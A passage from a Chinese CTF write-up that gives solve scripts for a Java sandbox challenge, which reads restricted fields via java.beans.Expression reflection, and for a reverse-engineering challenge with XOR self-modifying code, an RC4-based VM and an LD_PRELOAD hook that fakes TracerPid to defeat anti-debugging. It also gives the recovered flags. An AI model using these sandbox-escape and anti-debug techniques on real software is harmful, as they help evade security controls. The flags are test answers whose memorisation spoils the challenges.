的拦截；真正的反射动作发生在 JDK 类内部，我们自己的字节码里不出现受限调用。</p><p>得到 Field 之后，就可以正常 setAccessible(true) 并读取实例上的 flag 值，最后打印即可</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018212318114.png" alt="image-20251018212318114"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.Expression;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Expression</span> <span class="variable">expr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(obj.getClass(), <span class="string">&quot;getDeclaredField&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;flag&quot;</span>&#125;);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) expr.getValue();</span><br><span class="line">      field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> (String) field.get(obj);</span><br><span class="line">      System.out.println(flag);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018214124943.png" alt="image-20251018214124943"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.Expression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">solve</span><span class="params">(Object ignored)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Expression</span> <span class="variable">expr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(System.class, <span class="string">&quot;getenv&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;FLAG2&quot;</span>&#125;);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> expr.getValue();</span><br><span class="line">      <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String flag &amp;&amp; !flag.isEmpty()) &#123;</span><br><span class="line">          <span class="keyword">return</span> flag;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;notflag&#123;&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举高手的-bomblab-审判"><a href="#枚举高手的-bomblab-审判" class="headerlink" title="枚举高手的 bomblab 审判"></a>枚举高手的 bomblab 审判</h3><h4 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h4><p>sub_16B0 自修改：调用 mprotect 将 loc_1550 区域改写可执行并基于地址 Xor 复原，再改回只读执行。静态分析时手动解密或运行到 mprotect 之后 dump 代码即可绕过</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020220621812.png" alt="image-20251020220621812"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x42 - base + (uintptr_t)p = 0x42 - base + (base + i) = 0x42 + i。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x1550</span></span><br><span class="line">length = <span class="number">339</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">  original = ida_bytes.get_wide_byte(base + i)</span><br><span class="line">  decoded = original ^ (<span class="number">0x42</span> + i)</span><br><span class="line">  ida_bytes.patch_byte(base + i, decoded)</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020220947642.png" alt="image-20251020220947642"></p><p>可以看到有个check_debugger</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0x20</span>, <span class="number">0x95</span>, <span class="number">0x44</span>, <span class="number">0x0C</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x94</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0x70</span>, <span class="number">0x94</span>, <span class="number">0x1A</span>, <span class="number">0xD0</span>, <span class="number">0xA3</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0x42</span>, <span class="number">0x93</span>,</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0xE0</span>, <span class="number">0x4F</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x1D</span>, <span class="number">0x6C</span>, <span class="number">0xD1</span>, <span class="number">0xF1</span>, <span class="number">0x22</span>, <span class="number">0x71</span>, <span class="number">0xDE</span>, <span class="number">0xCB</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x9F</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x71</span>, <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x7A</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x56</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x56</span>, <span class="number">0x5C</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] ^ <span class="number">0x25</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>in1T_Arr@y_1S_s0_E@sy</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b42095440c4e330794fbfb70941ad0a30a5c429338e04f61151a005138c27d1d6cd1f12271decbd32f3c8b9f61&quot;</span>)</span><br><span class="line">key = <span class="string">b&quot;in1T_Arr@y_1S_s0_E@sy&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line">prev = seed[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seed)):</span><br><span class="line">    t = ((prev ^ key[i % <span class="built_in">len</span>(key)] ^ <span class="number">0x3C</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    rot = ((t &lt;&lt; ((i &amp; <span class="number">3</span>) + <span class="number">1</span>)) &amp; <span class="number">0xFF</span>) | (t &gt;&gt; (<span class="number">8</span> - ((i &amp; <span class="number">3</span>) + <span class="number">1</span>)))</span><br><span class="line">    flag.append(rot ^ <span class="number">0xA5</span>)</span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(seed):</span><br><span class="line">        prev = seed[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>flag{iN1t_arR@Y_w1Th_sMc_@NTI_dBg_1s_S0_e@Sy}</p><h4 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h4><p>是个虚拟机逆向</p><p>check_flag2_vm 要求输入长度 0x27；它将 “sneaky_key\n” 拼在 flag 之前放入工作区，再执行一个字节码虚拟机。</p><p>字节码常量见 g_vm_bytecode：</p><ol><li>先对 VM 内存地址 0x100、0x101 设为 0；</li><li>RC4 初始化（opcode 0x40）使用 0x100 处 key 区：由 “sneaky_key\n” 和用户输入拼接而成；</li><li>RC4 生成 keystream 写入 0x400…；</li></ol><p>0x40有个RC4</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020221928541.png" alt="image-20251020221928541"></p><p>opcode 0x40 分支里，把一段缓冲区初始化为 S[i] &#x3D; i，然后循环对 j 进行 j +&#x3D; S[i] + key[i % key_len]，随即交换 S[i] 与 S[j]——这正是 RC4 的 KSA</p><p>0x41加密：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020222003866.png" alt="image-20251020222003866"></p><p>常量区里了有“sneaky_key\n” 作为 key 前缀，与用户输入拼起来给 RC4</p><p>低字节类（<code>v4 &lt;= 0x21</code>）：</p><ul><li><code>0x00</code> — 终止并比较：执行 <code>memcmp(&amp;v52, &amp;g_vm_target_state, 0x27)</code>。</li><li><code>0x01</code> — push 一个 1 字节立即数（下一个字节）。<code>v3 += 2</code>，<code>v47[v2++ + 8] = imm</code>.</li><li><code>0x03</code> — push 一个 32 位常量（从字节流 + table 组合出来）。<code>v3 += 5</code>，<code>v47[v2++ + 8] = const32</code>。这是把复杂常量放到栈上的方法。</li><li><code>0x04</code> — pop（<code>--v2</code>）。</li><li><code>0x05</code> — 复制顶元素：<code>v47[v2 + 8] = v47[v2 + 7]</code> 然后 <code>v2++</code>（把栈顶复制一份）。</li><li><code>0x20</code> — 从 <code>v47[528 + idx]</code> 读取一个字节并 push（<code>idx</code> 由栈值决定）。如果 <code>idx &gt; 0x3FFF</code> 则返回比较失败。</li><li><code>0x21</code> — 把栈顶写入 <code>v47[528 + idx]</code>（即写到 keystream&#x2F;key 区）。如果 <code>idx &gt; 0x3FFF</code> 则返回比较失败。</li></ul><p>高字节类（<code>v4 &gt; 0x21</code>）：在代码里只出现两种</p><ul><li><p><code>0x40</code> — 初始化 S-box（类似 RC4 的 KSA）：</p><p> 从栈弹出若干参数（偏移、key 长度、key 偏移等），在 <code>v48[offset + 0..0xFF]</code> 填入 0..255，然后根据 <code>v47[528 + key_off ..]</code> 的 key 做 256 次交换，最终将置换结果保存在 <code>v48[offset ..]</code>。</p></li><li><p><code>0x41</code> — 产生&#x2F;混合 keystream（RC4 的 PRGA）</p></li></ul><p>因此可以把 VM 中的 <code>0x40</code> + <code>0x41</code> 看成“用存在于 <code>v47[528...]</code> 的 key 初始化 RC4，然后用 RC4 生成一个 keystream并 XOR 到 <code>v47[528 + ...]</code> 的某些位置”。</p><p>可能生成对s盒进行了变换</p><p>只能动调了，把反调试的jz改成jnz后</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024204002172.png" alt="image-20251024204002172"></p><p>运行到这</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024204035479.png" alt="image-20251024204035479"></p><p>向上跟踪到s盒处，把S盒替换了就行</p><p>还有几种可能的思路</p><ol><li>模拟运行</li><li>识别修改处</li><li>把密文patch进去，跑一遍直接看输出</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">content = [</span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x5B</span>, <span class="number">0xE6</span>, <span class="number">0xC0</span>, <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xD3</span>, <span class="number">0xB0</span>,</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0xE2</span>, <span class="number">0x87</span>, <span class="number">0x8C</span>, <span class="number">0x10</span>, <span class="number">0x99</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x88</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x40</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xA1</span>, <span class="number">0x9D</span>, <span class="number">0xEE</span>, <span class="number">0x3B</span>, <span class="number">0x90</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0xD4</span>, <span class="number">0x42</span>, <span class="number">0x65</span>, <span class="number">0xEB</span>, <span class="number">0xD7</span>, <span class="number">0x61</span>, <span class="number">0xF5</span>, <span class="number">0xBF</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rc4number = <span class="number">256</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_endecode</span>(<span class="params">s, content, rc4number</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % rc4number</span><br><span class="line">        j = (j + s[i]) % rc4number</span><br><span class="line">        s[i],s[j] = s[j],s[i]</span><br><span class="line">        t = (s[i] + s[j]) % rc4number</span><br><span class="line">        content[k] = <span class="built_in">chr</span>(content[k] ^ s[t])</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span>.join(content)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = [</span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0xE2</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x6A</span>, <span class="number">0xB1</span>, <span class="number">0xFF</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x60</span>, <span class="number">0xDD</span>,</span><br><span class="line">    <span class="number">0x56</span>, <span class="number">0xC7</span>, <span class="number">0x35</span>, <span class="number">0xF5</span>, <span class="number">0x1B</span>, <span class="number">0xA5</span>, <span class="number">0x21</span>, <span class="number">0x98</span>, <span class="number">0x5F</span>, <span class="number">0xAB</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0xA9</span>, <span class="number">0x11</span>, <span class="number">0x59</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>, <span class="number">0x0D</span>, <span class="number">0x4A</span>, <span class="number">0x90</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0xD7</span>, <span class="number">0x84</span>, <span class="number">0x8F</span>, <span class="number">0x2A</span>, <span class="number">0xEA</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0xB8</span>, <span class="number">0x77</span>, <span class="number">0xD2</span>, <span class="number">0x39</span>, <span class="number">0xA3</span>, <span class="number">0x3B</span>, <span class="number">0xD0</span>, <span class="number">0x25</span>, <span class="number">0x8E</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x9C</span>, <span class="number">0xBE</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x83</span>, <span class="number">0x9B</span>, <span class="number">0xCC</span>, <span class="number">0x76</span>, <span class="number">0x9D</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x6F</span>, <span class="number">0x8D</span>, <span class="number">0xFD</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0x5A</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0xE5</span>, <span class="number">0xCF</span>, <span class="number">0x29</span>, <span class="number">0xE0</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0xA0</span>, <span class="number">0x86</span>, <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0x4B</span>, <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x2B</span>, <span class="number">0xDB</span>, <span class="number">0x64</span>, <span class="number">0x68</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0xB9</span>, <span class="number">0x8A</span>, <span class="number">0x7E</span>, <span class="number">0x19</span>, <span class="number">0x75</span>, <span class="number">0x96</span>, <span class="number">0x5B</span>, <span class="number">0x13</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0x22</span>, <span class="number">0x5E</span>, <span class="number">0x48</span>, <span class="number">0xDA</span>, <span class="number">0x14</span>, <span class="number">0xAC</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0xF3</span>, <span class="number">0xAE</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x87</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x44</span>, <span class="number">0xF7</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x80</span>, <span class="number">0xF0</span>, <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x12</span>, <span class="number">0x43</span>, <span class="number">0x07</span>, <span class="number">0xBF</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xC4</span>, <span class="number">0xD9</span>, <span class="number">0xC2</span>, <span class="number">0x31</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0xFE</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0xDC</span>, <span class="number">0x34</span>, <span class="number">0xAD</span>, <span class="number">0xF4</span>, <span class="number">0x33</span>, <span class="number">0xBC</span>, <span class="number">0xD5</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xD1</span>, <span class="number">0xB5</span>, <span class="number">0x09</span>, <span class="number">0x2F</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0xED</span>, <span class="number">0x70</span>, <span class="number">0x2C</span>, <span class="number">0x15</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0xA8</span>, <span class="number">0x94</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x91</span>, <span class="number">0xCE</span>, <span class="number">0x7F</span>, <span class="number">0x6B</span>, <span class="number">0x54</span>, <span class="number">0x26</span>, <span class="number">0xB6</span>, <span class="number">0x01</span>, <span class="number">0xD3</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0xC8</span>, <span class="number">0x85</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x7B</span>, <span class="number">0x72</span>, <span class="number">0x40</span>, <span class="number">0x53</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x37</span>, <span class="number">0xE3</span>, <span class="number">0x71</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0x79</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0xCB</span>, <span class="number">0x55</span>, <span class="number">0xBA</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x50</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0x93</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x24</span>, <span class="number">0xA7</span>, <span class="number">0xD6</span>, <span class="number">0x9E</span>, <span class="number">0x9F</span>, <span class="number">0x3C</span>, <span class="number">0xF1</span>, <span class="number">0x45</span>, <span class="number">0xEC</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x7A</span>, <span class="number">0x6E</span>, <span class="number">0x8C</span>, <span class="number">0x57</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0x63</span>, <span class="number">0x1C</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x4D</span>, <span class="number">0x06</span>, <span class="number">0x18</span>, <span class="number">0xC6</span>, <span class="number">0x23</span>, <span class="number">0x2D</span>, <span class="number">0x47</span>, <span class="number">0xA4</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x6D</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0xB0</span>, <span class="number">0xEF</span>, <span class="number">0x3D</span>, <span class="number">0xEB</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x03</span>, <span class="number">0x97</span>, <span class="number">0xC3</span>, <span class="number">0xEE</span></span><br><span class="line">]</span><br><span class="line">rc4_endecode(s, content, rc4number)</span><br></pre></td></tr></table></figure><p>flag{EAsy_vm_usINg_rC4_ALGo_1S_S0_e@SY}</p><blockquote><p>又回去看了遍生成S盒没有变动，那我应该就是key搞错了，key是sneaky_key，而非’&#x2F;nsneaky_key’，因为我发现生成S盒的%0xA而非0xB，所以猜测第一个不是密钥😂</p></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025112011467.png" alt="image-20251025112011467"></p><p>关于本题还有其他的反反调试手段这里记录下。程序读取的是这里的TraceID来实现检测</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024212657134.png" alt="image-20251024212657134"></p><p>我们把它hook掉就行</p><blockquote><p>看TracePid说明当前进程已经被 PID 9467 跟踪 —— 的确存在调试&#x2F;ptrace。</p></blockquote><p>让AI给了一份脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hide_tracer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> FILE *(*<span class="type">fopen_t</span>)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">fopen_t</span> real_fopen = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成一个假的 /proc/self/status 内容，其中保证包含 TracerPid: 0 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> fake_status[] =</span><br><span class="line"><span class="string">&quot;Name:\tmyproc\n&quot;</span></span><br><span class="line"><span class="string">&quot;State:\tR (running)\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pid:\t1234\n&quot;</span></span><br><span class="line"><span class="string">&quot;PPid:\t1\n&quot;</span></span><br><span class="line"><span class="string">&quot;TracerPid:\t0\n&quot;</span>   <span class="comment">/* &lt;-- 关键：返回 0 表示未被调试 */</span></span><br><span class="line"><span class="string">&quot;Uid:\t1000\t1000\t1000\t1000\n&quot;</span></span><br><span class="line"><span class="string">&quot;VmSize:\t0 kB\n&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 替换 fopen，只在 path == &quot;/proc/self/status&quot; 时返回内存 FILE* */</span></span><br><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">        real_fopen = (<span class="type">fopen_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; <span class="built_in">strcmp</span>(path, <span class="string">&quot;/proc/self/status&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* fmemopen 在 glibc 可用：把字符串当作 FILE* 返回 */</span></span><br><span class="line">        <span class="comment">/* 注意：fmemopen 需要可写缓冲区，因此复制一份到 malloc 的区域 */</span></span><br><span class="line">        <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, fake_status, <span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">return</span> fmemopen(buf, <span class="keyword">sizeof</span>(fake_status) - <span class="number">1</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 其他文件按真实 fopen 处理 */</span></span><br><span class="line">    <span class="keyword">return</span> real_fopen(path, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个最大的坑点是，远程调试需要用这个命令去设置环境变量启动调试器，在Parameters里设置没有用!!!：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o hide_tracer.so 